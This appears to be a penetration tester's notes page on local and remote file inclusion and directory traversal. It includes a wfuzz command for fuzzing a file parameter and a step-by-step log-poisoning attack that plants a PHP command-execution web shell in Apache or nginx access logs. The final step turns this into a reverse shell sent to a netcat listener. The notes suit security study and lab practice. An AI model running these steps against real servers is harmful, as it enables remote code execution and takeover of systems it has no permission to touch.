---
layout: default
title: LFI & RFI
parent: HTTP
grand_parent: TCP
nav_order: 4-3-6
---
# LFI (Local File Inclusion), RFI (Remote File Inclusion) & Directory Traversal
## Testing Methodology
- Mail Server? (See Mail log poisoning below)
- Can we modify our user agent header in Burp Suite? e.g. if '../../proc/self/environ' exists, we could modify our user agent to be "<?php code ?>

### Command Reference
- After parameter discovery is performed, or you know of a parameter to inject (e.g. "file")
```
export URL="http://$IP/thankyou.php?file=FUZZ"
wfuzz -c -z file,/opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt "$URL"
```

### Attacks
<b> Log poisoning </b>
- Apache: Do we see a lot of requests if we navigate to '../../../../var/log/apache2/access.log'? (if not, proper permissions are set)
> Example:
STEP 1: Set up netcat to connect on port 80: ```nc -nv $IP 80``` <br/>
STEP 2: Plant the code through GET Headers: ```GET /<?php passthru($_GET['cmd']);?>``` ('cmd' is only the value used to call things) <br/>
STEP 3: Send the code - a 404 will be received but it will exist within the logs.
<i>If this is nginx it will likely be under: /var/log/nginx/access.log</i>
STEP 4: From the browser head to the extension example: http://$IP/file=/var/log/nginx/access.log?cmd=ping -c 182.168.57.1 (we should see pings hit our interface)
STEP 5: Create a bash shell as the payload, wrap the payload inside 'bash -c', URL encode and set up the netcat listener - run the full encoded payload value through the 'cmd' call.


<b> Mail log poisoning </b>
- If we have a mail server, is it possible to add code inside the mail logs? Visit those mail logs through the web server to execute the payload


